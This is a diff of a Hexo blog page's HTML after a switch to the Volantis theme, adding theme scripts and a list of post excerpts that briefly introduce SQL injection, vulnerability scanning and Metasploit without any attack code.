+            <a href="/archives/"
+              
+              
+              id="archives">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f5c3.svg'><p>归档</p>
+            </a>
+          
+            <a href="/faqs/"
+              
+              
+              id="faqs">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f516.svg'><p>帮助</p>
+            </a>
+          
+            <a href="/examples/"
+              
+              
+              id="examples">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f396.svg'><p>示例</p>
+            </a>
+          
+            <a href="/contributors/"
+              
+              
+              id="contributors">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f389.svg'><p>社区</p>
+            </a>
+          
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
-</footer>
+</div>
+
+          <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+  
+    <div class='safearea'>
+      <div class='body-wrapper' id="pjax-container">
+        
+          <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">false</div> 
+  <div id="pjax-pageTitle"></div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path"></div> 
+  <div id="pjax-comment-placeholder"></div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("full" == "none") { // 移除封面 
+    document.getElementsByClassName('cover-wrapper')[0].style.display = "none"; 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("full" == "half") { // 半屏 
+      document.getElementsByClassName('cover-wrapper')[0].setAttribute('id', 'half'); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("full" == "full") { // 全屏 
+      document.getElementsByClassName('cover-wrapper')[0].setAttribute('id', 'full'); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover-wrapper')[0].style.display = ""; 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+ 
+
+        
+        
+
+<div class='l_main'>
+  
+  <section class="post-list">
+    
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+          
+        
+          
+        
+          
+        
+      
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow">
+  
+  
+  
+  
+    
+    <h2 class="article-title" >
+      <a href="/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/">
+        Jul 25, 2020
+      </a>
+    </h2>
+  
+  <div class='md'>
+    
+      
+        Web 入侵先遣——SQL注入攻击技术初探前言SQL 注入式攻击技术，一般针对基本 Web 平台的应用程序，造成 SQL 注入 攻击漏洞的原因，是由于程序员在编写 Web 程序时，没有对浏览器端提交的参数进行严格的过滤和判断。用户可以修改构造参数，提交 SQL 查询语句，并传递至服务器端，从而获得想要的敏感信息，甚至执行危险的代码或系统命令。
+虽然 SQL 注入攻击技术早已出现，三十时至今日...
+      
+    
+  </div>
+  
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+        <time>2020-07-25</time>
+        
+      </div>
+      
+        <div>
+          <a class='readmore' href='/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/'>
+            Read More
+          </a>
+        </div>
+      
     </div>
-    <nav id="mobile-nav">
   
-    <a href="/" class="mobile-nav-link">Home</a>
+
+</div>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow">
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
   
-</nav>
+  
+  
+    
+    <h2 class="article-title" >
+      <a href="/2020/07/19/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/">
+        Jul 19, 2020
+      </a>
+    </h2>
+  
+  <div class='md'>
+    
+      
+        一，漏洞扫描技术1.1扫描原理1.1.1. Ping 检测win+R -&gt; cmd -&gt; ping + 目标IP
+当 ping 通目标 IP 后 返回 TTL值判断目标 IP 的操作系统
+TTL=128：可能是 windows xp/2000/2003 系统
+TTL=64：可能是 windows 7/2008/10 系统，Linux系统
+TTL=255：可能是交换机，路由器设备
+...
+      
+    
+  </div>
+  
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+        <time>2020-07-19</time>
+        
+      </div>
+      
+        <div>
+          <a class='readmore' href='/2020/07/19/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/'>
+            Read More
+          </a>
+        </div>
+      
+    </div>
+  
+
+</div>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow">
+  
+  
+  
+  
+    
+    <h2 class="article-title" >
+      <a href="/2020/07/04/MSF/">
+        Jul 4, 2020
+      </a>
+    </h2>
+  
+  <div class='md'>
+    
+      
+        一.初识    MSF1.1什么是MetasploitMetasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时,计算机安全状况也被永久性地改变了。仿佛一夜之间...
+      
+    
+  </div>
+  
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+        <time>2020-07-04</time>
+        
+      </div>
+      
+        <div>
+          <a class='readmore' href='/2020/07/04/MSF/'>
+            Read More
+          </a>
+        </div>
+      
+    </div>
+  
+
+</div>
+
+          </div>
+        
+      
+    
+  </section>
+  
+    
+  
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
     
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<section class="widget blogger shadow desktop mobile">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+        
+        
+          <p><span id="jinrishici-sentence">Hexo</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/volantis-x/"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="/"
+              class="social fas fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+
+  
+
+  
+    
+    
+
+  
+
+  
+
+
+</aside>
+
+
+
+      </div>
+      
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+          
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        Use
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.0.0-rc.4" target="_blank" class="codename">Volantis</a>
+        as theme
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2017-2020 XXX</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+      <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+    </div>
+  </div>
+  <div>
+    <!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    setTimeout(function() {
+      loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+    }, 1);
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+</script>
+
+
+<!-- internal -->
+
+
+
+
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
 
 
   
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+    <script>
+      window.FPConfig = {
+        delay: 0,
+        ignoreKeywords: [],
+        maxRPS: 5,
+        hoverDelay: 25
+      };
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
 
   
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    if(!document.querySelectorAll("#valine_container")[0])return;
+
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) || "快来评论吧~";
+
+    let path = $.trim($('#pjax-comment-path').text());
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: path,
+      appId: "",
+      appKey: "",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
 
 
 
 
-<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/app.js"></script>
 
 
 
 
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+(function ($) {
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+})(jQuery);
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'http://example.com' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'http://example.com' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'http://example.com' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+<!-- more -->
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+          if (typeof $.fancybox == "undefined") {
+            SCload_fancybox();
+          } else {
+            pjax_fancybox();
+          }
+        
+        
+        
+        
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
   </div>
 </body>
 </html>
